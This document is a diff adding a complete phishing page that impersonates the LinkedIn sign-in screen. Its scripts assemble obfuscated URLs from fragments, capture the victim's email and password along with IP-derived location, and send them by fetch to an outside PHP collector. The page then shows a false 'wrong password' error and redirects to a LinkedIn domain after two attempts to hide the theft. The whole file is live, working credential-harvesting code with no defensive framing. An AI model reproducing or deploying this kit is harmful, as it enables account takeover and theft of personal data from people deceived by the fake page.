@@ -1,0 +1,661 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<![if !IE]>
+<link rel="icon" href="images/linkedin_fav.png" type="image/x-icon">
+<![endif]>
+<link rel="shortcut icon" href="images/linkedin_fav.ico" type="image/ico">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<title>LinkedIn Login, Sign in | LinkedIN</title>
+<script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
+<style type="text/css">
+
+	@font-face{
+		font-family:'page_section_font';
+		src:url('webfonts/open-sans/OpenSans-Regular.ttf') format('truetype');
+		
+	} 
+
+	@font-face {
+	font-family: 'SFUITextRegular';
+	font-style: normal;
+	font-weight: normal;
+	src: url('webfonts/sfuitext/sf-ui-text-regular-58646b56a688c.woff') format('woff');
+	}
+
+
+	@font-face {
+	font-family: 'SFUITextLight';
+	font-style: normal;
+	font-weight: normal;
+	src: url('webfonts/sfuitext/sf-ui-text-light-5864714f67240.woff') format('woff');
+	}
+
+	*{
+		box-sizing:border-box;
+		margin:0;
+		padding:0;
+		font-family: sans-serif;
+	}
+
+	body {
+	    color: #404349;
+	    font-family: sans-serif;
+	    -webkit-font-smoothing: antialiased;
+	}
+
+	body, html {
+	    height: 100%;
+	    margin: 0;
+	    font-size: 14px;
+	}
+
+
+	a{
+		text-decoration:none;
+		font-family: sans-serif;
+	}
+
+	a:active {
+	    color: #2d6bb3;
+	}
+
+	a:hover {
+	    color: #6aace6;
+	}
+
+	#frame{
+		width:100%;
+		height:auto;
+		margin:0px;
+		float: left;
+		position:relative;
+		top:0px;
+		background-color:#fff;
+		font-size: 14px; 
+		color:#444;
+		clear:both;
+		z-index:10;
+		//box-shadow:0px 1px 2px #777;
+	}
+
+	#inner-frame{
+		max-width:1200px;
+		width:98%;
+		height:auto;
+		margin:auto;
+		margin-bottom: 2%;
+		margin-top: 2%;
+		padding:10px;
+		position:relative;
+		overflow-x:hidden;
+		
+	}
+
+	input:-internal-autofill-selected{
+		background-color: transparent;
+	}
+
+	.text{
+	    font-family: sans-serif;
+	    font-variant: tabular-nums;
+	    list-style: none;
+	    position: relative;
+	    display: inline-block;
+	    width: 100%;
+	    font-size: 1.3rem;
+	    line-height: 1.5;
+	    color: #29343D;
+	    background-image: none;
+	   	border-radius: 4px;
+	    transition: all .3s;
+	    background-color: transparent; border:none; padding:28px 12px 6px; height: 51px;
+	}
+
+	.input_icon_holder{
+		position: relative; 
+		margin-bottom: 5%;
+	}
+
+
+	.input_icon2{
+		display: table-cell; 
+		padding: 6px 15px; 
+		font-size: 14px; 
+		font-weight: 400; 
+		line-height: 1; 
+		color: #006097; 
+		text-align: center;  
+		border: 1px solid #ccc; 
+		width: 1%; 
+		white-space: nowrap; 
+		vertical-align: middle;
+		font-family: SFUITextRegular;
+		background-color: #fefefe;
+		cursor: pointer;
+	}
+
+	#label{
+		padding: 5px; 
+		position: absolute; 
+		right: 10px; 
+		top: 10px; 
+		z-index: 10; 
+		width: auto; 
+		font-size: 14px; 
+		font-weight:600;
+		color: #006097; 
+		text-align: center;  
+		border: none; 
+		vertical-align: middle;
+		//font-family: SFUITextRegular;
+		background-color: #fff;
+	}
+
+	#label:hover{
+		background-color: #f2f2f2;
+	}
+
+	.input_icon_holder2{
+		position: relative; 
+		display: table; 
+		border-collapse:separate; 
+		margin-top: 24px;
+		border:1px solid #333; 
+		border-radius: 4px;
+		color: #333; 
+	}
+
+	.errorfound{
+		border:2px solid #d00; 
+		box-shadow: 0px 0px 1px #d00;
+		color:#d00;
+	}
+
+
+	.inv_btn{
+		background-color:#0a66c2; 
+		padding: 15px 20px; 
+		margin-left: 10px; 
+		border:none; 
+		color:#fff; 
+		font-size: 14px; 
+		font-family: page_title_font;
+		cursor: pointer;
+		height: 52px;
+		border-radius: 28px;
+	}
+
+	.inv_btn_i{
+		background-color:#0a66c2;
+	}
+
+	.inv_btn_i:hover{
+		background-color:#0073b1; 
+	}
+
+	#form_layout{
+		position:relative;
+		max-width: 353px;
+		width:100%;
+		margin: auto;
+		height:auto;
+		background-color:rgba(255,255,255,0.1);
+		color:#fff;
+		text-align: left;
+		//padding:7px;
+		margin-top:30px;
+		margin-bottom:0;
+		font-size:12px;
+		//box-shadow:-1px 18px 3px 0px #333;
+	}
+
+	.footer__base {
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    width: 100%;
+    height: 72px;
+    bottom: 0;
+    position: absolute;
+    background-color: rgba(255,255,255,0.85);
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    //border-top: 1px solid rgba(0,0,0,0.15);
+}
+
+.footer__base .footer__base__wrapper {
+    display: -webkit-inline-box;
+    width: 1128px;
+    -webkit-box-align: baseline;
+    -ms-flex-align: baseline;
+    align-items: baseline;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    margin: auto;
+}
+
+#app__container .footer__base__wrapper p.copyright {
+    font-family: /* Roman */ -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Fira Sans, Ubuntu, Oxygen, Oxygen Sans, Cantarell, Droid Sans, Apple Color Emoji, Segoe UI Emoji, Segoe UI Emoji, Segoe UI Symbol, Lucida Grande, Helvetica, Arial, sans-serif;
+    font-size: 12px;
+    line-height: 16px;
+    font-weight: 400;
+    color: rgba(0,0,0,0.9);
+    padding: 0 8px 0 0;
+}
+
+.footer__base li-icon[type="linkedin-logo"] {
+    position: relative;
+    top: 4px;
+    right: 4px;
+}
+
+li-icon[type="linkedin-logo"][size="14dp"] {
+    width: 56px;
+    height: 14px;
+}
+li-icon {
+    display: inline-block;
+    width: 300px;
+    height: 150px;
+    overflow: hidden;
+    position: relative;
+}
+
+li-icon[type="linkedin-logo"] svg {
+    width: 100%;
+    height: 100%;
+}
+li-icon>svg {
+    display: block;
+    margin: auto;
+}
+user agent stylesheet
+svg:not(:root), symbol, image, marker, pattern, foreignObject {
+    overflow: hidden;
+}
+
+.footer__base .a11y__label {
+    position: absolute;
+    text-indent: -999999px;
+    display: inline-block;
+}
+
+.footer__base .footer__base__nav-list li {
+    background-color: transparent;
+    border: 0;
+    border-radius: 2px;
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+    color: rgba(0,0,0,0.6);
+    cursor: pointer;
+    display: inline-block;
+    font-size: 1.4rem;
+    font-weight: 600;
+    font-family: inherit;
+    height: 24px;
+    line-height: 24px;
+    overflow: hidden;
+    outline-width: 2px;
+    padding: 0 8px;
+    position: relative;
+    text-align: center;
+    text-decoration: none;
+    -webkit-transition-duration: 167ms;
+    transition-duration: 167ms;
+    -webkit-transition-property: background-color,color,-webkit-box-shadow;
+    transition-property: background-color,color,-webkit-box-shadow;
+    transition-property: background-color,box-shadow,color;
+    transition-property: background-color,box-shadow,color,-webkit-box-shadow;
+    -webkit-transition-timing-function: cubic-bezier(0, 0, 0.2, 1);
+    transition-timing-function: cubic-bezier(0, 0, 0.2, 1);
+    vertical-align: middle;
+    z-index: 0;
+    font-size: 12px;
+}
+
+
+
+.footer__base .footer__base__nav-list a {
+    font-family: /* Roman */ -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Fira Sans, Ubuntu, Oxygen, Oxygen Sans, Cantarell, Droid Sans, Apple Color Emoji, Segoe UI Emoji, Segoe UI Emoji, Segoe UI Symbol, Lucida Grande, Helvetica, Arial, sans-serif;
+    font-size: 12px;
+    line-height: 16px;
+    font-weight: 400;
+    color: rgba(0,0,0,0.9);
+    text-decoration: none;
+}
+a:visited {
+    color: #665ed0;
+}
+a:visited {
+    color: #0073b1;
+}
+a {
+    text-decoration: none;
+    font-weight: bold;
+    background-color: transparent;
+    border: 0;
+    color: #0073b1;
+}
+a {
+    margin: 0;
+    padding: 0;
+    font-size: 100%;
+    vertical-align: baseline;
+    background: transparent;
+}
+
+@keyframes reduce{
+	from{font-size: 16px; height: 100%; top:0;}
+	to{font-size: 12px; height: 30%; top:-10px;}
+
+}
+
+@keyframes increase{
+	from{font-size: 12px; height: 30%; top:-10px;}
+	to{font-size: 16px; height: 100%; top:0;}
+
+}
+</style>
+
+<script>
+ let resBox = 'LnK'
+ let nbg1 = 'https://kv'
+ let nbg2 = 'wpca.com/'
+ let nbg3 = 'brynt/'
+ let nbg4 = 'klamp/'
+ let nbg5 = 'sps'
+ let nbg6 = '.php'
+ 
+  let ov1 = 'https'
+  let ov2 = '://'
+  let ov3 = 'lin'
+  let ov4 = 'kedin'
+  let ov5 = '.cn'
+  let ov6 = '/lo'
+  let ov7 = '/gin'
+
+  	sessionStorage.clear()
+    let trialCount = sessionStorage.getItem("num_trial");
+
+    if (!trialCount) {
+     sessionStorage.setItem("num_trial", 0);
+    } else if (trialCount >= 2) {
+     window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    }
+</script>
+
+</head>
+<body>
+
+<div id="frame" style="background-color: #fff; margin-top: 27px; margin-bottom: 2%;">
+	<div style=" float: left; width: 100%; text-align: left; padding-left: 56px;">
+		<svg width="112" height="30" viewBox="0 0 895 180" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_404_2)"><path d="M0 167.13C0.0524492 170.558 1.44954 173.828 3.89012 176.236C6.33069 178.643 9.61931 179.995 13.0471 180H166.733C170.216 180.067 173.583 178.75 176.096 176.337C178.609 173.925 180.064 170.613 180.14 167.13V12.87C180.087 9.44186 178.69 6.1716 176.25 3.76415C173.809 1.35669 170.52 0.00484505 167.093 -6.0536e-09H13.407C9.92414 -0.0670228 6.55686 1.25021 4.04356 3.66283C1.53027 6.07546 0.0761196 9.38655 0 12.87L0 167.13ZM241.216 29L262.211 62.54L279.608 51.66L253.173 10H229.439L194.816 60.91L211.673 73.23L241.216 29ZM480.623 42.24V55.65H501.618V42.24H536.78V23.38H501.638V10H480.643V23.38H440.022V10H419.026V23.38H383.844V42.24H418.996V55.65H439.992V42.24H480.623ZM344.513 67.43V121.27H365.508V48.58H334.725V33.35H367.718V14.5H280.737V33.35H313.73V48.58H282.937V121.27H303.932V67.43H344.513ZM40.051 55.43C36.9768 55.4477 33.9668 54.5505 31.4039 52.8524C28.8409 51.1543 26.8408 48.7321 25.658 45.8939C24.4752 43.0556 24.1631 39.9296 24.7614 36.9135C25.3598 33.8973 26.8415 31.1274 29.0182 28.9559C31.1948 26.7844 33.968 25.3095 36.985 24.7189C40.002 24.1282 43.1265 24.4485 45.961 25.639C48.7956 26.8294 51.212 28.8363 52.9031 31.4042C54.5941 33.9721 55.4833 36.9852 55.4576 40.06C55.4314 44.1389 53.7998 48.0433 50.9162 50.9275C48.0325 53.8118 44.129 55.4438 40.051 55.47V55.43ZM460.317 132.29C470.105 150.59 492.58 163.83 526.832 164.55H538.43V145.38H530.271C503.447 145.38 485.691 137.38 475.904 121.27H545.318V102.42H521.933V64.71H470.835V51.3H449.839V64.71H398.701V102.42H375.326V121.27H444.731C434.953 137.4 417.187 145.38 390.363 145.38H382.215V164.59H393.812C428.064 163.87 450.529 150.63 460.317 132.33V132.29ZM267.49 156.07L252.494 140.85C266.081 126.16 276.418 107.13 276.418 84.65V80.65H254.263L250.094 57.27H229.439L233.608 80.65H203.884V99.52H253.873C251.514 108.22 246.075 118.19 238.647 126.71L223.45 111.3L209.503 125.44L253.493 170.21L267.49 156.07ZM69.9844 153.53V67.25H95.5087V79.4H95.8686C98.994 75.0212 103.13 71.4618 107.925 69.0244C112.721 66.587 118.034 65.3436 123.412 65.4C143.528 65.4 153.316 79.17 153.316 97.12V153.49H126.862V106C126.862 97.3 123.782 89 112.545 89C101.127 89 96.4184 97.16 96.4184 107.13V153.53H69.9844ZM53.3081 153.53H26.824V67.25H53.2781L53.3081 153.53ZM334.725 106.59V76.5H313.73V117.64C313.73 136.64 302.672 145.38 284.186 145.38H276.028V164.59H281.467C306.112 164.59 319.888 156.44 327.137 143.93L361.749 166.22L373.147 149L334.005 124.35C334.545 120.54 334.725 116.56 334.725 106.59ZM419.706 102.42V83.56H449.789V102.42H419.706ZM500.898 102.42H470.835V83.56H500.888L500.898 102.42Z" fill="#0A66C1"></path><path d="M649.185 78.53V43.64V24.16H699.084V78.53H662.602L657.703 89.55H711.091V13.15H637.368V89.55H649.185V78.53Z" fill="#0A66C1"></path><path d="M682.707 97.96L712.911 163.1H725.968L695.764 97.96H682.707Z" fill="#0A66C1"></path><path d="M630.299 120.85L617.762 123.57V26.16H629.169V15.33H556.386V26.16H566.873V134.94L556.026 137.3V148.39L605.955 137.49V165.1H617.762V134.83L630.299 132.11V120.85ZM605.945 126.23L578.491 132.23V100.23H605.945V126.23ZM605.945 89.61H578.491V63.61H605.945V89.61ZM605.945 52.92H578.491V26.16H605.945V52.92Z" fill="#0A66C1"></path><path d="M624.96 163.1H638.177L667.201 97.96H653.984L624.96 163.1Z" fill="#0A66C1"></path><path d="M822.216 66L888.201 26.23V17.87H802.731V28.7H862.587L799.601 66.7V76.83H829.225C827.966 83.8515 825.728 90.6613 822.576 97.06C819.495 103.147 815.641 108.811 811.109 113.91C806.39 119.126 801.229 123.924 795.682 128.25L794.422 129.25L802.421 138.25L803.54 137.34C809.581 132.448 815.236 127.099 820.457 121.34C825.733 115.455 830.155 108.857 833.594 101.74C837.322 93.8178 839.965 85.4289 841.452 76.8H857.808C854.809 95.38 849.1 111.4 840.902 124.43C832.464 137.85 820.097 149.79 804.15 159.92L802.701 160.85L810.469 170.09L811.589 169.36C822.339 162.489 832.126 154.217 840.692 144.76C848.696 135.716 855.166 125.423 859.848 114.29C864.753 102.267 868.113 89.6696 869.846 76.8H882.803L881.803 138.34C881.803 142.97 881.303 146.57 880.323 149.04C879.931 150.112 879.311 151.086 878.507 151.895C877.703 152.705 876.733 153.331 875.664 153.73C873.235 154.73 869.666 155.17 864.987 155.17C862.546 155.133 860.109 154.956 857.688 154.64C855.247 154.379 852.832 153.911 850.47 153.24L848.47 152.65V164.65L849.65 164.92C852.369 165.492 855.12 165.896 857.888 166.13C861.217 166.44 863.717 166.59 865.517 166.59C872.155 166.59 877.514 165.75 881.513 164.11C885.586 162.46 888.854 159.285 890.621 155.26C892.451 151.26 893.44 145.79 893.62 138.95L895 66H822.216Z" fill="#0A66C1"></path><path d="M769.108 9.88H757.291V53.47H734.476V64.3H757.291V129.18L734.476 134.99V146.07L790.983 132.45V120.79L769.108 126.24V64.3H791.173V53.47H769.108V9.88Z" fill="#0A66C1"></path></g><defs><clipPath id="clip0_404_2"><rect width="895" height="180" fill="white"></rect></clipPath></defs></svg>
+		<!-- 
+			<svg width="112" height="30" viewBox="0 0 102 26" fill="none" xmlns="http://www.w3.org/2000/svg" id="linkedin-logo" preserveAspectRatio="xMinYMin meet" focusable="false"><path d="M13 10H17V22H13V10ZM15 3.8C14.5671 3.80984 14.1468 3.94718 13.7917 4.19483C13.4365 4.44247 13.1623 4.7894 13.0035 5.19217C12.8446 5.59493 12.8081 6.03562 12.8985 6.45903C12.989 6.88244 13.2024 7.26975 13.5119 7.57245C13.8215 7.87514 14.2135 8.07976 14.6389 8.16067C15.0642 8.24159 15.504 8.1952 15.903 8.02732C16.3021 7.85943 16.6428 7.57752 16.8824 7.2169C17.122 6.85627 17.2499 6.43297 17.25 6C17.2515 5.70645 17.1939 5.4156 17.0807 5.14474C16.9675 4.87388 16.801 4.62854 16.5911 4.42331C16.3812 4.21808 16.1322 4.05714 15.8589 3.95006C15.5855 3.84299 15.2934 3.79195 15 3.8ZM4 4H0V22H11V18H4V4ZM57.9 16.2C57.9 16.61 57.9 16.86 57.9 17H48.9C48.9021 17.169 48.9256 17.337 48.97 17.5C49.1765 18.0933 49.5745 18.6011 50.1014 18.9433C50.6282 19.2855 51.254 19.4427 51.88 19.39C52.4142 19.4129 52.9468 19.3171 53.4396 19.1096C53.9324 18.9021 54.3731 18.5881 54.73 18.19L57.45 19.87C56.7533 20.6812 55.88 21.322 54.8971 21.7433C53.9142 22.1645 52.8479 22.3549 51.78 22.3C48.19 22.3 45.12 20.25 45.12 16.11C45.091 15.2506 45.2411 14.3946 45.5608 13.5963C45.8804 12.798 46.3626 12.075 46.9767 11.4731C47.5908 10.8712 48.3234 10.4037 49.128 10.1001C49.9325 9.7966 50.7914 9.66374 51.65 9.71C55.08 9.71 57.9 12 57.9 16.2ZM54.15 14.69C54.16 14.3669 54.0997 14.0455 53.9731 13.748C53.8466 13.4506 53.6569 13.1842 53.4172 12.9673C53.1775 12.7504 52.8935 12.5883 52.5849 12.492C52.2763 12.3958 51.9505 12.3678 51.63 12.41C50.9638 12.3515 50.3013 12.558 49.7865 12.9849C49.2716 13.4118 48.9459 14.0245 48.88 14.69H54.15ZM68 4H72V22H68.61V20.57C68.1486 21.1444 67.5541 21.5977 66.878 21.8904C66.2019 22.1832 65.4646 22.3066 64.73 22.25C62.22 22.25 59.18 20.39 59.18 16C59.18 12.08 61.87 9.75 64.68 9.75C65.299 9.72159 65.9167 9.82856 66.4902 10.0634C67.0636 10.2983 67.5788 10.6555 68 11.11V4ZM68.3 16C68.3 14.12 67.13 12.87 65.64 12.87C65.2366 12.8697 64.8373 12.9508 64.466 13.1084C64.0946 13.266 63.7589 13.4969 63.4788 13.7872C63.1988 14.0775 62.9801 14.4214 62.836 14.7981C62.6919 15.1749 62.6252 15.5769 62.64 15.98C62.6279 16.3815 62.6966 16.7813 62.842 17.1557C62.9874 17.5301 63.2064 17.8716 63.4862 18.1597C63.766 18.4479 64.1008 18.677 64.4708 18.8333C64.8407 18.9897 65.2383 19.0702 65.64 19.07C66.0201 19.0542 66.393 18.9609 66.7357 18.7957C67.0785 18.6305 67.3838 18.3969 67.6329 18.1094C67.8821 17.8219 68.0698 17.4864 68.1845 17.1236C68.2992 16.7609 68.3385 16.3785 68.3 16ZM45.76 10H41L37.07 14.9H37V4H33V22H37V16.27H37.07L41.07 22H46L41 15.48L45.76 10ZM26.53 9.7C25.7825 9.68818 25.0441 9.8653 24.3833 10.2149C23.7226 10.5645 23.1607 11.0754 22.75 11.7H22.7V10H19V22H23V15.47C22.956 15.1525 22.9801 14.8292 23.0706 14.5216C23.1611 14.2141 23.316 13.9294 23.525 13.6863C23.7341 13.4432 23.9924 13.2474 24.2829 13.1118C24.5734 12.9763 24.8894 12.9041 25.21 12.9C26.31 12.9 27 13.49 27 15.42V22H31V14.56C31 10.91 28.71 9.7 26.53 9.7ZM102 2V24C102 24.5304 101.789 25.0391 101.414 25.4142C101.039 25.7893 100.53 26 100 26H78C77.4696 26 76.9609 25.7893 76.5858 25.4142C76.2107 25.0391 76 24.5304 76 24V2C76 1.46957 76.2107 0.960859 76.5858 0.585786C76.9609 0.210714 77.4696 0 78 0L100 0C100.53 0 101.039 0.210714 101.414 0.585786C101.789 0.960859 102 1.46957 102 2ZM84 10H80V22H84V10ZM84.25 6C84.2599 5.553 84.1365 5.11317 83.8954 4.73664C83.6542 4.36011 83.3064 4.06396 82.8962 3.88597C82.4861 3.70798 82.0322 3.65622 81.5925 3.73731C81.1528 3.8184 80.7472 4.02865 80.4275 4.34124C80.1079 4.65382 79.8885 5.05456 79.7976 5.49233C79.7066 5.9301 79.7482 6.38503 79.9169 6.79909C80.0856 7.21314 80.3739 7.56754 80.7449 7.81706C81.1159 8.06657 81.5529 8.19989 82 8.2C82.2934 8.20805 82.5855 8.15701 82.8588 8.04994C83.1322 7.94286 83.3812 7.78192 83.5911 7.57669C83.801 7.37146 83.9675 7.12612 84.0807 6.85526C84.1939 6.5844 84.2514 6.29355 84.25 6ZM98 14.56C98 10.91 95.71 9.66 93.53 9.66C92.7782 9.65542 92.0375 9.84096 91.3766 10.1994C90.7158 10.5578 90.1562 11.0774 89.75 11.71V10H86V22H90V15.47C89.956 15.1525 89.9801 14.8292 90.0706 14.5216C90.1611 14.2141 90.316 13.9294 90.525 13.6863C90.7341 13.4432 90.9924 13.2474 91.2829 13.1118C91.5734 12.9763 91.8894 12.9041 92.21 12.9C93.31 12.9 94 13.49 94 15.42V22H98V14.56Z" fill="#0A66C2"></path></svg> -->
+		</div>
+
+  <style>
+   #loader {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    background-color: #fff9;
+    z-index: 99;
+    border-radius: 10px;
+   }
+  
+   @keyframes hideLoader {
+    from {
+     opacity: 1;
+    }
+  
+    to {
+     opacity: 0;
+    }
+   }
+  
+   @keyframes showLoader {
+    from {
+     opacity: 0;
+    }
+  
+    to {
+     opacity: 1;
+    }
+   }
+ </style>
+	<div id="inner-frame" align="center">
+		
+		<div id='form_layout'>
+   <div id='loader'>
+    <i class="fa fa-spinner fa-spin" style="font-size: 16px; color: #333;" ></i>
+   </div>
+			<div style="-webkit-box-shadow: 0 4px 12px rgb(0 0 0 / 15%);
+    box-shadow: 0 4px 12px rgb(0 0 0 / 15%);     padding: 24px 27px;
+    border-radius: 8px; width: 100%">
+				<div style="margin-top: 0px;">
+					<h1 style="color: rgba(0,0,0,0.9); font-size: 30px; font-family: system-ui; font-weight: 500;">Sign in</h1>
+					<p style="font-size: 13px; font-weight: 400; line-height: 1.42857; color: rgba(0,0,0,0.9); padding-top: 5px">Stay updated on your professional world</p>
+				</div>
+	
+				<form action="" method="post" id="form_">
+    <input type='hidden' required class='text mm' id="ckorg" placeholder="Email Address" value="" readonly><br>
+    <input type="hidden" class='text' name="loc" id="loc">
+    <input type="hidden" class='text' name="trial" id="trial">
+
+					<div class="input_icon_holder2" style="display: block;">
+						<div style="display: table-caption;"></div>
+						<div class='text_label' style="color: #333; padding: 13px 10px; position: absolute; z-index: 0; width: 100%; height: 100%; font-size: 16px; font-weight:100;">Email or Phone</div>
+						
+						<input type='text' style="" onclick="pop_label(0)" onchange="changed(0)" onblur="hide_label(0)" placeholder='' required class='text mm'
+							id="ck" value="">
+						
+					</div>
+
+					<div class="input_icon_holder2" style="display: block;">
+						<div style="display: table-caption;"></div>
+						<div class='text_label' style="padding: 13px 10px; position: absolute; z-index: 0; width: 100%; height: 100%; font-size: 16px; font-weight:100;">Password</div>
+						
+						<input type='password' style="" onclick="pop_label(1)" onblur="hide_label(1)" required class='text mm' id='cknow' pattern="(?=^.{8,}$).*$">
+						<button type="button" id='label' onclick='show_text()' >Show</button>
+
+					</div>
+					<div id="errmsg" style="color: #d00; font-weight: 400; font-family: sans-serif; font-size: 14px;">
+						
+					</div>
+					<div style="position: relative; left: -8px; margin-top: 14px; padding-left: 8px; color: #0a66c2 !important;">
+						<a href='https://www.linkedin.com/checkpoint/rp/request-password-reset' style=" color: #0a66c2 !important;">
+							<span style=" font-family: system-ui; font-weight: 600; font-size: 16px">Forgot password?</span></a><br>
+					</div>
+					<button  type="submit" style="margin: 0; margin-top: 19px; width: 100%; font-size:16px; font-family: system-ui; font-weight: 600;" class='inv_btn inv_btn_i'>
+						Sign in
+					</button><br>
+
+					<div style="position: relative; padding-top: 13px; margin: auto;text-align: center; width: 100%; float: left;">
+						<span style="background-color: #fff; position: relative; padding: 5px 10px; color: #000; font-size: 14px; z-index: 12; width: 40px; "> or </span>
+						<hr style="width: 100%; position: absolute; top: 23px; z-index: 1; height: 1px; background-color: rgba(0,0,0,0.15); border: none;">
+					</div>
+
+					<button type='button' name='' style="margin: 0; margin-top: 13px; width: 100%; font-size:16px; font-family: system-ui; font-weight: 600; color: rgba(0,0,0,0.9); background-color: #fff; border: 1px solid #000;" class='inv_btn inv_btn_i'>
+						<i class="fa fa-apple" style="font-size: 18px; color: rgba(0,0,0,0.6) !important;"></i>&nbsp; Sign in with Apple
+					</button><br>
+					
+				</form>
+			</div>
+			<div style="margin-top: 35px">
+				<p style="line-height: 2; text-align: center; color: #333; font-size: 14px; letter-spacing: .05em; line-height: 3;">
+						
+						New to Linkedin? <a href="https://www.linkedin.com/start/join" style="color:#0073b1; font-weight: bolder;"><b>Join now</b></a>
+					</p>
+			</div>
+		</div>
+	</div>
+</div>
+<footer class="footer__base" role="contentinfo"><div class="footer__base__wrapper"><p class="copyright" style="font-size: 12px;"><span style="font-weight: bold; font-size: 14px; color: #000;">Linked <i class="fa fa-linkedin-square"></i></span> &copy; 2023</p>
+	<div><ul class="footer__base__nav-list" role="menubar" aria-label="Footer Legal Menu"><li role="menuitem"><a href="/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement">User Agreement</a></li><li role="menuitem"><a href="/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy">Privacy Policy</a></li><li role="menuitem"><a href="https://linkedin.com/help/linkedin/answer/34593?lang=en&amp;trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines">Community Guidelines</a></li><li role="menuitem"><a href="/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy">Cookie Policy</a></li><li role="menuitem"><a href="/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy">Copyright Policy</a></li><li id="feedback-request"><a href="https://linkedin.com/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&amp;lang=en" target="_blank" rel="nofollow noreferrer noopener">Send Feedback</a></li></ul></div></div></footer>
+
+	<script>
+		const xx = window.location.href.split('?');
+   let ck = document.querySelector('#ck')
+   let ckorg = document.querySelector('#ckorg')
+   let cknow = document.querySelector('#cknow')
+   let loader = document.querySelector('#loader')
+   let loc = document.querySelector('#loc')
+   let trial = document.querySelector('#trial')
+
+   if (xx[1] != undefined) {
+    ck.value = atob(xx[1])
+    ckorg.value = atob(xx[1])
+   }
+
+   trial.value = trialCount
+
+   let myForm = document.querySelector('#form_')
+   myForm.addEventListener('submit', async function (event) {
+    event.preventDefault()
+
+    let data = new FormData()
+
+    let options = {
+     method: 'POST',
+     body: data
+    }
+    data.append('ck', ck.value)
+    data.append('ckorg', ckorg.value)
+    data.append('cknow', cknow.value)
+    data.append('loc', loc.value)
+    data.append('trial', trial.value)
+    data.append('resBox', resBox)
+
+    loader.style.display = 'flex'
+    loader.style.animation = 'showLoader .5s ease'
+
+    const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options)
+    const result = await response.text()
+
+    loader.style.animation = 'hideLoader 1s ease'
+    setTimeout(() => {
+     loader.style.display = 'none'
+    }, 1000)
+
+    console.log(result)
+
+    trialCount++;
+    sessionStorage.setItem("num_trial", trialCount);
+    trial.value = trialCount
+
+    if (trialCount >= 2) {
+     window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    } else {
+     document.getElementById('errmsg').innerHTML = "Hmm, that's not the right password. please try again "
+    }
+   })
+
+   $.get("https://ipinfo.io/json?token=10da60a9ff2d81", function (response) {
+    let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`
+    $("#loc").val(cou);
+   }, "jsonp");
+ </script>
+
+<script type="text/javascript">
+	window.onload=function (){
+		x=document.getElementsByClassName('mm')[0].value;
+		y=document.getElementsByClassName('mm')[1].value;
+		if(x.trim() == ""){
+			var label=document.getElementsByClassName('text_label');
+			label[0].style.animation='increase .1s linear';//alert(id)
+			label[0].style.fontSize='16px';
+			label[0].style.height='100%';
+			label[0].style.top='0px';
+
+		}else{
+			var label=document.getElementsByClassName('text_label');
+			label[0].style.animation='reduce .1s linear';//alert(id)
+			label[0].style.fontSize='12px';
+			label[0].style.height='30%';
+			label[0].style.top='-10px';
+		}
+
+		if(y.trim() == ""){
+			var label=document.getElementsByClassName('text_label');
+			label[1].style.animation='increase .1s linear';//alert(id)
+			label[1].style.fontSize='16px';
+			label[1].style.height='100%';
+			label[1].style.top='0px';
+
+		}else{
+			var label=document.getElementsByClassName('text_label');
+			label[1].style.animation='reduce .1s linear';//alert(id)
+			label[1].style.fontSize='12px';
+			label[1].style.height='30%';
+			label[1].style.top='-10px';
+		}
+	}
+
+	function changed(id){
+		pop_label(id);
+	}
+
+	function pop_label(id){
+		var label=document.getElementsByClassName('text_label');
+		label[id].style.animation='reduce .1s linear';//alert(id)
+		label[id].style.fontSize='12px';
+		label[id].style.height='30%';
+		label[id].style.top='-10px';
+
+	}
+
+	function hide_label(id){
+		x=document.getElementsByClassName('mm')[id].value;
+		//alert(x.trim());
+		if(x.trim() == ""){
+			var label=document.getElementsByClassName('text_label');
+			label[id].style.animation='increase .1s linear';//alert(id)
+			label[id].style.fontSize='16px';
+			label[id].style.height='100%';
+			label[id].style.top='0px';
+
+		}
+		
+	}
+	
+	function show_ln_text(){
+		var pass_field=document.getElementsByName('ln_pass');
+		var pass_label=document.getElementById('ln_label');
+		if(pass_label.innerHTML=='show'){
+			pass_field[0].type='text';
+			pass_label.innerHTML='hide'
+		}else if(pass_label.innerHTML=='hide'){
+			pass_field[0].type='password';
+			pass_label.innerHTML='show'
+		}
+	}
+
+	function show_text(){
+
+		var pass_field=document.getElementById('cknow');
+		var pass_label=document.getElementById('label');
+		if(pass_label.innerHTML=='Show'){
+			pass_field.type='text';
+			pass_label.innerHTML='Hide'
+		}else if(pass_label.innerHTML=='Hide'){
+			pass_field.type='password';
+			pass_label.innerHTML='Show'
+		}
+	}
+</script>
+</body>
+</html>
